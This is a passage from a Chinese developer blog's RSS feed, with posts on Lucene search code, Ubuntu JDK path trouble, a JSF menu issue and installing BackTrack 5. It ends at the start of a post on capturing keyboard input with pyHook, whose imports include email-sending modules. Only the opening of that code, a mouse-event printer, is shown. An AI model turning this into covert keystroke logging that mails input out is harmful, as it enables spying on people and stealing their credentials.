<div id="scid:9D7513F9-C04C-4721-824A-2B34F0212519:9ddf5b89-1001-4966-a8df-b55c77bfefd9" class="wlWriterEditableSmartContent" style="float: none; padding-bottom: 0px; padding-top: 0px; padding-left: 0px; margin: 0px; display: inline; padding-right: 0px"><pre style=" width: 800px; height: 575px;background-color:White;overflow: auto;"><div><!--

Code highlighting produced by Actipro CodeHighlighter (freeware)
http://www.CodeHighlighter.com/

--><span style="color: #000000;">
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> java.io.File;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> java.sql.Connection;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> java.sql.ResultSet;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> java.sql.Statement;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> java.util.ArrayList;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> java.util.List;

</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.analysis.Analyzer;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.document.Document;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.document.Field;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.document.Field.TermVector;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.index.DirectoryReader;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.index.IndexReader;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.index.IndexWriter;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.index.IndexWriterConfig;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.queryparser.classic.QueryParser;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.search.IndexSearcher;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.search.Query;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.search.ScoreDoc;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.search.TopDocs;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.store.Directory;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.store.FSDirectory;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.util.Version;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.wltea.analyzer.lucene.IKAnalyzer;

</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> com.zhuoda.model.SearchBean;
</span><span style="color: #0000FF;">import</span><span style="color: #000000;"> com.zhuoda.util.JdbcUtil;

</span><span style="color: #0000FF;">public</span><span style="color: #000000;"> </span><span style="color: #0000FF;">class</span><span style="color: #000000;"> SearchLogic {     
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> </span><span style="color: #0000FF;">static</span><span style="color: #000000;"> Connection conn </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">;     
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> </span><span style="color: #0000FF;">static</span><span style="color: #000000;"> Statement stmt </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">;     
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> </span><span style="color: #0000FF;">static</span><span style="color: #000000;">  ResultSet rs </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">;     
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> String searchDir </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #000000;">&quot;</span><span style="color: #000000;">E:\\Test\\Index</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">;     
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> </span><span style="color: #0000FF;">static</span><span style="color: #000000;"> File indexFile </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">;     
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> </span><span style="color: #0000FF;">static</span><span style="color: #000000;"> IndexSearcher searcher </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">;     
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> </span><span style="color: #0000FF;">static</span><span style="color: #000000;"> Analyzer analyzer </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">;     
    </span><span style="color: #008000;">/**</span><span style="color: #008000;">   
    * 获取数据库数据   
    * </span><span style="color: #808080;">@return</span><span style="color: #008000;"> ResultSet   
    * </span><span style="color: #808080;">@throws</span><span style="color: #008000;"> Exception   
    </span><span style="color: #008000;">*/</span><span style="color: #000000;">    
    </span><span style="color: #0000FF;">public</span><span style="color: #000000;"> List</span><span style="color: #000000;">&lt;</span><span style="color: #000000;">SearchBean</span><span style="color: #000000;">&gt;</span><span style="color: #000000;"> getResult(String queryStr) </span><span style="color: #0000FF;">throws</span><span style="color: #000000;"> Exception {     
        List</span><span style="color: #000000;">&lt;</span><span style="color: #000000;">SearchBean</span><span style="color: #000000;">&gt;</span><span style="color: #000000;"> result </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">;     
        conn </span><span style="color: #000000;">=</span><span style="color: #000000;"> JdbcUtil.getConnection();     
        </span><span style="color: #0000FF;">if</span><span style="color: #000000;">(conn </span><span style="color: #000000;">==</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">) {     
            </span><span style="color: #0000FF;">throw</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> Exception(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">数据库连接失败！</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">);     
        }     
        String sql </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #000000;">&quot;</span><span style="color: #000000;">select goods_id, goods_name,goods_img from ecs_goods</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">;     
        </span><span style="color: #0000FF;">try</span><span style="color: #000000;"> {     
            stmt </span><span style="color: #000000;">=</span><span style="color: #000000;"> conn.createStatement();     
            rs </span><span style="color: #000000;">=</span><span style="color: #000000;"> stmt.executeQuery(sql);     
          </span><span style="color: #008000;">//</span><span style="color: #008000;">  this.createIndex(rs);   </span><span style="color: #008000;">//</span><span style="color: #008000;">给数据库创建索引,此处执行一次，不要每次运行都创建索引，以后数据有更新可以后台调用更新索引     </span><span style="color: #008000;">
</span><span style="color: #000000;">            TopDocs topDocs </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">this</span><span style="color: #000000;">.search(queryStr);     
            ScoreDoc[] scoreDocs </span><span style="color: #000000;">=</span><span style="color: #000000;"> topDocs.scoreDocs;     
            result </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">this</span><span style="color: #000000;">.addHits2List(scoreDocs);     
        } </span><span style="color: #0000FF;">catch</span><span style="color: #000000;">(Exception e) {     
            e.printStackTrace();     
            </span><span style="color: #0000FF;">throw</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> Exception(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">数据库查询sql出错！ sql : </span><span style="color: #000000;">&quot;</span><span style="color: #000000;"> </span><span style="color: #000000;">+</span><span style="color: #000000;"> sql);     
        } </span><span style="color: #0000FF;">finally</span><span style="color: #000000;"> {     
            </span><span style="color: #0000FF;">if</span><span style="color: #000000;">(rs </span><span style="color: #000000;">!=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">) rs.close();     
            </span><span style="color: #0000FF;">if</span><span style="color: #000000;">(stmt </span><span style="color: #000000;">!=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">) stmt.close();     
            </span><span style="color: #0000FF;">if</span><span style="color: #000000;">(conn </span><span style="color: #000000;">!=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">) conn.close();     
        }              
        </span><span style="color: #0000FF;">return</span><span style="color: #000000;"> result;     
    }     
  
</span><span style="color: #008000;">/**</span><span style="color: #008000;">   
* 为数据库检索数据创建索引   
* </span><span style="color: #808080;">@param</span><span style="color: #008000;"> rs   
* </span><span style="color: #808080;">@throws</span><span style="color: #008000;"> Exception   
</span><span style="color: #008000;">*/</span><span style="color: #000000;">    
    @SuppressWarnings(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">deprecation</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">)
    </span><span style="color: #0000FF;">public</span><span style="color: #000000;"> </span><span style="color: #0000FF;">void</span><span style="color: #000000;"> createIndex(ResultSet rs) </span><span style="color: #0000FF;">throws</span><span style="color: #000000;"> Exception {     
        Directory directory </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">;     
        IndexWriter indexWriter </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">;     
         
        </span><span style="color: #0000FF;">try</span><span style="color: #000000;"> {     
            indexFile </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> File(searchDir);     
            </span><span style="color: #0000FF;">if</span><span style="color: #000000;">(</span><span style="color: #000000;">!</span><span style="color: #000000;">indexFile.exists()) {     
                indexFile.mkdir();     
            }
            </span><span style="color: #0000FF;">else</span><span style="color: #000000;"> {
                deleteDir(indexFile);
            }
            directory </span><span style="color: #000000;">=</span><span style="color: #000000;"> FSDirectory.open(indexFile);     
            analyzer </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> IKAnalyzer();     
            IndexWriterConfig config </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> IndexWriterConfig(Version.LUCENE_44, analyzer);
            indexWriter </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> IndexWriter(directory, config);     
            Document doc </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">;     
            </span><span style="color: #0000FF;">while</span><span style="color: #000000;">(rs.next()) {     
                doc </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> Document();     
                Field id </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> Field(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">goods_id</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">, String.valueOf(rs.getInt(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">goods_id</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">)), Field.Store.YES, Field.Index.NOT_ANALYZED, TermVector.NO);     
                Field goods_name </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> Field(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">goods_name</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">, rs.getString(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">goods_name</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">) </span><span style="color: #000000;">==</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;"> </span><span style="color: #000000;">?</span><span style="color: #000000;"> </span><span style="color: #000000;">&quot;&quot;</span><span style="color: #000000;"> : rs.getString(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">goods_name</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">), Field.Store.YES,Field.Index.ANALYZED, TermVector.NO); 
                Field goods_img </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> Field(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">goods_img</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">, rs.getString(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">goods_img</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">) </span><span style="color: #000000;">==</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;"> </span><span style="color: #000000;">?</span><span style="color: #000000;"> </span><span style="color: #000000;">&quot;&quot;</span><span style="color: #000000;"> : rs.getString(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">goods_img</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">), Field.Store.YES,Field.Index.ANALYZED, TermVector.NO); 
                doc.add(id);     
                doc.add(goods_name);     
                doc.add(goods_img);
                indexWriter.addDocument(doc);     
            }     
                         
            indexWriter.commit();     
            indexWriter.close();     
        } </span><span style="color: #0000FF;">catch</span><span style="color: #000000;">(Exception e) {     
            e.printStackTrace();     
        }      
    }     
   
    
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> </span><span style="color: #0000FF;">static</span><span style="color: #000000;"> </span><span style="color: #0000FF;">void</span><span style="color: #000000;"> deleteDir(File dir) {
        </span><span style="color: #0000FF;">if</span><span style="color: #000000;"> (dir.isDirectory()) {
            String[] children </span><span style="color: #000000;">=</span><span style="color: #000000;"> dir.list();
            </span><span style="color: #0000FF;">for</span><span style="color: #000000;"> (</span><span style="color: #0000FF;">int</span><span style="color: #000000;"> i</span><span style="color: #000000;">=</span><span style="color: #000000;">0</span><span style="color: #000000;">; i</span><span style="color: #000000;">&lt;</span><span style="color: #000000;">children.length; i</span><span style="color: #000000;">++</span><span style="color: #000000;">) {
                deleteDir(</span><span style="color: #0000FF;">new</span><span style="color: #000000;"> File(dir, children[i]));
            }
        }
        dir.delete();
    }
        
    </span><span style="color: #008000;">/**</span><span style="color: #008000;">   
    * 搜索索引   
    * </span><span style="color: #808080;">@param</span><span style="color: #008000;"> queryStr   
    * </span><span style="color: #808080;">@return</span><span style="color: #008000;">   
    * </span><span style="color: #808080;">@throws</span><span style="color: #008000;"> Exception   
    </span><span style="color: #008000;">*/</span><span style="color: #000000;">    
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> TopDocs search(String queryStr) </span><span style="color: #0000FF;">throws</span><span style="color: #000000;"> Exception {            
        </span><span style="color: #0000FF;">if</span><span style="color: #000000;">(searcher </span><span style="color: #000000;">==</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">) {     
            indexFile </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> File(searchDir);     
            Directory directory </span><span style="color: #000000;">=</span><span style="color: #000000;">FSDirectory.open(indexFile);   
            IndexReader ireader</span><span style="color: #000000;">=</span><span style="color: #000000;">DirectoryReader.open(directory);
            searcher </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> IndexSearcher(ireader);       
        }     
        searcher.setSimilarity(</span><span style="color: #0000FF;">new</span><span style="color: #000000;"> IKSimilarity());     
        QueryParser parser </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> QueryParser(Version.LUCENE_44,</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">goods_name</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">,</span><span style="color: #0000FF;">new</span><span style="color: #000000;"> IKAnalyzer());     
        Query query </span><span style="color: #000000;">=</span><span style="color: #000000;"> parser.parse(queryStr);  
          
        TopDocs topDocs </span><span style="color: #000000;">=</span><span style="color: #000000;"> searcher.search(query, </span><span style="color: #000000;">10</span><span style="color: #000000;">);     
        </span><span style="color: #0000FF;">return</span><span style="color: #000000;"> topDocs;     
    }  
      
    </span><span style="color: #008000;">/**</span><span style="color: #008000;">   
    * 返回结果并添加到List中   
    * </span><span style="color: #808080;">@param</span><span style="color: #008000;"> scoreDocs   
    * </span><span style="color: #808080;">@return</span><span style="color: #008000;">   
    * </span><span style="color: #808080;">@throws</span><span style="color: #008000;"> Exception   
    </span><span style="color: #008000;">*/</span><span style="color: #000000;">    
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> List</span><span style="color: #000000;">&lt;</span><span style="color: #000000;">SearchBean</span><span style="color: #000000;">&gt;</span><span style="color: #000000;"> addHits2List(ScoreDoc[] scoreDocs ) </span><span style="color: #0000FF;">throws</span><span style="color: #000000;"> Exception {     
        List</span><span style="color: #000000;">&lt;</span><span style="color: #000000;">SearchBean</span><span style="color: #000000;">&gt;</span><span style="color: #000000;"> listBean </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> ArrayList</span><span style="color: #000000;">&lt;</span><span style="color: #000000;">SearchBean</span><span style="color: #000000;">&gt;</span><span style="color: #000000;">();     
        SearchBean bean </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">;     
        </span><span style="color: #0000FF;">for</span><span style="color: #000000;">(</span><span style="color: #0000FF;">int</span><span style="color: #000000;"> i</span><span style="color: #000000;">=</span><span style="color: #000000;">0</span><span style="color: #000000;"> ; i</span><span style="color: #000000;">&lt;</span><span style="color: #000000;">scoreDocs.length; i</span><span style="color: #000000;">++</span><span style="color: #000000;">) {     
            </span><span style="color: #0000FF;">int</span><span style="color: #000000;"> docId </span><span style="color: #000000;">=</span><span style="color: #000000;"> scoreDocs[i].doc;     
            Document doc </span><span style="color: #000000;">=</span><span style="color: #000000;"> searcher.doc(docId);     
            bean </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> SearchBean();     
            bean.setId(doc.get(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">goods_id</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">));     
            bean.setGoodsname(doc.get(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">goods_name</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">));     
            bean.setGoodsImg(doc.get(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">goods_img</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">));
            listBean.add(bean);     
        }     
        </span><span style="color: #0000FF;">return</span><span style="color: #000000;"> listBean;     
    }  
      
    </span><span style="color: #0000FF;">public</span><span style="color: #000000;"> List</span><span style="color: #000000;">&lt;</span><span style="color: #000000;">SearchBean</span><span style="color: #000000;">&gt;</span><span style="color: #000000;"> serachGoods(String words) {     
        SearchLogic logic </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">new</span><span style="color: #000000;"> SearchLogic();     
        List</span><span style="color: #000000;">&lt;</span><span style="color: #000000;">SearchBean</span><span style="color: #000000;">&gt;</span><span style="color: #000000;"> result </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #0000FF;">null</span><span style="color: #000000;">;
        </span><span style="color: #0000FF;">try</span><span style="color: #000000;"> {     
            Long startTime </span><span style="color: #000000;">=</span><span style="color: #000000;"> System.currentTimeMillis();     
            result </span><span style="color: #000000;">=</span><span style="color: #000000;"> logic.getResult(words);     
             
              
            System.out.println(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">searchBean.result.size : </span><span style="color: #000000;">&quot;</span><span style="color: #000000;"> </span><span style="color: #000000;">+</span><span style="color: #000000;"> result.size());     
            Long endTime </span><span style="color: #000000;">=</span><span style="color: #000000;"> System.currentTimeMillis();     
            System.out.println(</span><span style="color: #000000;">&quot;</span><span style="color: #000000;">查询所花费的时间为：</span><span style="color: #000000;">&quot;</span><span style="color: #000000;"> </span><span style="color: #000000;">+</span><span style="color: #000000;"> (endTime</span><span style="color: #000000;">-</span><span style="color: #000000;">startTime)</span><span style="color: #000000;">/</span><span style="color: #000000;">1000</span><span style="color: #000000;">);     
           
        } </span><span style="color: #0000FF;">catch</span><span style="color: #000000;"> (Exception e) {   
            e.printStackTrace();     
            System.out.println(e.getMessage());     
        }     
        </span><span style="color: #0000FF;">return</span><span style="color: #000000;"> result;
    }     
}    </span></div></pre><!-- Code inserted with Steve Dunn's Windows Live Writer Code Formatter Plugin.  http://dunnhq.com --></div></pre>

  <pre>分词工具类，网上找的：</pre>

  <div id="scid:9D7513F9-C04C-4721-824A-2B34F0212519:6ec14e45-45a6-4020-96df-a540944a6a3a" class="wlWriterEditableSmartContent" style="float: none; padding-bottom: 0px; padding-top: 0px; padding-left: 0px; margin: 0px; display: inline; padding-right: 0px"><pre style=" width: 800px; height: 575px;background-color:White;overflow: auto;"><div><!--

Code highlighting produced by Actipro CodeHighlighter (freeware)
http://www.CodeHighlighter.com/

--><span style="color: #0000FF;">import</span><span style="color: #000000;"> org.apache.lucene.search.similarities.DefaultSimilarity;

</span><span style="color: #008000;">/**</span><span style="color: #008000;">*
 * IK Analyzer v3.2
 * 相似度评估器
 * 重载了DefaultSimilarity的coord方法
 * 提高词元命中个数在相似度比较中的权重影响，即，当有多个词元得到匹配时，文档的相似度将提高
 *
 </span><span style="color: #008000;">*/</span><span style="color: #000000;">
</span><span style="color: #0000FF;">public</span><span style="color: #000000;"> </span><span style="color: #0000FF;">class</span><span style="color: #000000;"> IKSimilarity </span><span style="color: #0000FF;">extends</span><span style="color: #000000;"> DefaultSimilarity {
    </span><span style="color: #008000;">/**</span><span style="color: #008000;">*
     * 
     </span><span style="color: #008000;">*/</span><span style="color: #000000;">
    </span><span style="color: #0000FF;">private</span><span style="color: #000000;"> </span><span style="color: #0000FF;">static</span><span style="color: #000000;"> </span><span style="color: #0000FF;">final</span><span style="color: #000000;"> </span><span style="color: #0000FF;">long</span><span style="color: #000000;"> serialVersionUID </span><span style="color: #000000;">=</span><span style="color: #000000;"> </span><span style="color: #000000;">7558565500061194774L</span><span style="color: #000000;">;

    </span><span style="color: #008000;">/**</span><span style="color: #008000;"> (non-Javadoc)
     * </span><span style="color: #808080;">@see</span><span style="color: #008000;"> org.apache.lucene.search.Similarity#coord(int, int)
     </span><span style="color: #008000;">*/</span><span style="color: #000000;">
    </span><span style="color: #0000FF;">public</span><span style="color: #000000;"> </span><span style="color: #0000FF;">float</span><span style="color: #000000;"> coord(</span><span style="color: #0000FF;">int</span><span style="color: #000000;"> overlap, </span><span style="color: #0000FF;">int</span><span style="color: #000000;"> maxOverlap) {
        </span><span style="color: #0000FF;">float</span><span style="color: #000000;"> overlap2 </span><span style="color: #000000;">=</span><span style="color: #000000;"> (</span><span style="color: #0000FF;">float</span><span style="color: #000000;">)Math.pow(</span><span style="color: #000000;">2</span><span style="color: #000000;">, overlap);
        </span><span style="color: #0000FF;">float</span><span style="color: #000000;"> maxOverlap2 </span><span style="color: #000000;">=</span><span style="color: #000000;"> (</span><span style="color: #0000FF;">float</span><span style="color: #000000;">)Math.pow(</span><span style="color: #000000;">2</span><span style="color: #000000;">, maxOverlap);
        </span><span style="color: #0000FF;">return</span><span style="color: #000000;"> (overlap2 </span><span style="color: #000000;">/</span><span style="color: #000000;"> maxOverlap2);
    }    
}
</span></div></pre><!-- Code inserted with Steve Dunn's Windows Live Writer Code Formatter Plugin.  http://dunnhq.com --></div>
</div>

<p>可以根据项目需求写个bean，SearchBean。里面只要有些字段的getset方法就行。 </p>

<p>有一点需要注意的，就是生成新的索引时，要把旧的索引文件删除，否则会出现重复的结果。 </p>

<p>这篇文章是用windows live writer写的，但是没办法加标签，在网页上编辑后代码全都乱了，悲剧。知道怎么解决这个问题的同学给我留言吧</p>]]></description>
        <pubDate>Thu, 05 Sep 2013 16:46:34 +0800</pubDate>
        <guid>http://my.oschina.net/chen7/blog/159419</guid>
    </item>
			<item>
        <title>ubuntu 安装jdk的小意外</title>
        <link>http://my.oschina.net/chen7/blog/159268</link>
        <category>LINUX</category>
        <description><![CDATA[<p>之前装的是bt5，但是不知道为什么，用的时候一直kit会崩溃，找不到原因，并且对我的本本的显卡支持很不好，最大化最小化整个就是幻灯片，想把ubuntu内核升级成12.04也失败了。悲剧，最后直接装了ubuntu13.04</p>  <p>ubuntu13跟之前用过的版本差不多，不过动画效果做的更好了，软件库也更丰富。现在的linux版本里都将jdk拿掉了，连openjdk都没有，所以去官网下了个压缩包安装。</p>  <p>从网上找了个方法配置了下jdk，输入java –version，版本也对了。eclipse也可以运行了。但是重启后发现，无法登陆了！在登陆的时候屏幕一直闪屏，也没法进入text模式，只能强制重启，我擦。刚刚升级了ubuntu的软件包，难道要重装？谷歌了下也没找到是哪里的问题。后来想想应该是修改了path的原因，所以决定改回来试试。做了个u盘的livecd，进入系统后挂载原系统安装的盘符，找到/etc/environment，删除掉后面加的export PATH=$JAVA_HOME/bin:$JRE_HOME/bin:$PATH，重启，终于恢复了！</p>  <p>应该是ubuntu13的内核与之前版本不同，导致这个问题，之前的版本修改path应该是没有这种情况的，希望能帮到遇到同样问题的同学</p>]]></description>
        <pubDate>Thu, 05 Sep 2013 09:50:40 +0800</pubDate>
        <guid>http://my.oschina.net/chen7/blog/159268</guid>
    </item>
			<item>
        <title>关于 rich:dropDownMenu 的几点疑问</title>
        <link>http://my.oschina.net/chen7/blog/159040</link>
        <category>JSF</category>
        <description><![CDATA[<p>使用JSF2框架真心让人头大，各种没资料没例子没API。</p> 
<p>在写项目的过程中发现一个很奇怪的问题，通过在form里通过&lt;h:commandLink&gt;跳转，结果发现没有进入后他的action，直接跳回首页去了，查了各种可能都没发现原因。后来开firebug，发现点击后重新去解析了一次该请求，并没有去执行link里的action，这个页面是通过&lt;rich: dropDownMenu&gt;跳转过来的。我刷新了一次该页面，并没有提示重新发送请求之类的提示框，说明通过&lt;rich: dropDownMenu&gt;跳转并不是一个action跳转，我擦，这是个什么情况？然后查了下网上仅有的一些例子。估计问题是出在&lt;rich: dropDownMenu&gt;里的mode属性，但是只找到有两个选项可以用，ajax和client，都试了，还是老毛病。崩溃！</p> 
<p>因为时间比较紧，最后想算了。通过onclick去请求一个hidden的form去提交得了。问题又来了！在js里写的function，通过js生成dom对象form，然后给form的action赋值，妈蛋的，jsf解析这个页面的时候就去执行form 的这个action了，管你调用不调用！因为下午就要演示，所以用了自己都觉得恶心的办法，手动写了N个隐藏的form，然后每个&lt;rich:menuItem&gt;去提交一个form，额的神啊，太肮脏的代码了。希望知道如何解决的同学告诉一声，感激不尽！</p>]]></description>
        <pubDate>Wed, 04 Sep 2013 10:21:48 +0800</pubDate>
        <guid>http://my.oschina.net/chen7/blog/159040</guid>
    </item>
			<item>
        <title>WIN8下 安装bt5实战</title>
        <link>http://my.oschina.net/chen7/blog/157759</link>
        <category>LINUX</category>
        <description><![CDATA[<p>之前一直断断续续地使用Linux也有好几年了，无奈自己还是个菜鸟，惭愧。后来突发奇想（其实是看到血色星期一里的情节想到的），把系统放U盘里。前后使用了puppy和cdlinux，以及鼎鼎大名的fedora。puppy兼容性太差，cdlinux很好用，不过软件库太差，并且我那傲娇的集成显卡还不能识别，屏幕偏移的厉害，搞了好久，最后放弃了。fedora相比它们还是显得笨重了，并且2.0的U盘读取速度真心不行，后来决定还是装硬盘里好了。</p>  <p>前段时间关注了下黑客技术，了解到bt5貌似很牛逼的样子，于是下了个镜像文件。后来查了下说win8 的引导语linux各种不兼容，我用的是win8专业版，犹豫了半天，最后决定还是冒险试试。大不了最后进PE修复引导。之前装win8时留了50G给win7，后来win7一直没装，于是把win7的盘符格式成FAT32，之前是NTFS的，linux里识别不了。然后用UltraISO把镜像烧到u盘里。优盘启动。PS：启动前要将win8的快速启动关闭，网上查的是要这样，于是关掉了。发现开机速度反而快了，囧。。。</p>  <p>重启后进入text模式，输入startx进桌面系统。桌面上的install，主要说下分区，本文的精髓也在此。用的是ext4格式。分了2G给交换区（交换区文件格式就是交换区域），根目录，即“/”分了47.8G，<font color="#ff0000">留200M给“/boot” </font><font color="#000000">，如果没有这个区域的话，Linux的引导不会装到boot里，开机就会直接进win8。剩下的就很傻瓜了，点击下一步直到安装完成。重启后就可以通过Linux 的引导选择要进入的系统了。</font></p>  <p>花絮：重启进入bt5发现界面上还有个install，以为装错了，估计装的还是livecd，后来汉化了菜单后保存重启，发现系统设置是可以改变的，长出一口气。</p>]]></description>
        <pubDate>Thu, 29 Aug 2013 15:20:56 +0800</pubDate>
        <guid>http://my.oschina.net/chen7/blog/157759</guid>
    </item>
			<item>
        <title>python钩子小试</title>
        <link>http://my.oschina.net/chen7/blog/157385</link>
        <category>Python</category>
        <description><![CDATA[<p>前段时间发现python可以做很多底层的事情，于是想到能不能通过python记录键盘键入的信息，查了下，使用pyhook可以实现。pyhook的安装与依赖包一搜一大堆，这里就不详细说了，需要注意的是32位与64位的问题。闲话不多，下面贴代码;</p>  <div id="scid:9D7513F9-C04C-4721-824A-2B34F0212519:97eb38ee-8e29-48a9-8216-bd5bee252c3c" class="wlWriterEditableSmartContent" style="float: none; padding-bottom: 0px; padding-top: 0px; padding-left: 0px; margin: 0px; display: inline; padding-right: 0px"><pre class="brush: python; gutter: false; first-line: 1; tab-size: 4;  toolbar: false;  width: 800px; height: 575px;" style=" width: 800px; height: 575px;overflow: auto;"># -*- coding: utf-8 -*-
from email.mime.text import MIMEText
import pythoncom
import pyHook
import smtplib

str = ''


def onMouseEvent(event):
    # 监听鼠标事件
    print &quot;MessageName:&quot;, event.MessageName
    print &quot;Message:&quot;, event.Message
    print &quot;Time:&quot;, event.Time
    print &quot;Window:&quot;, event.Window
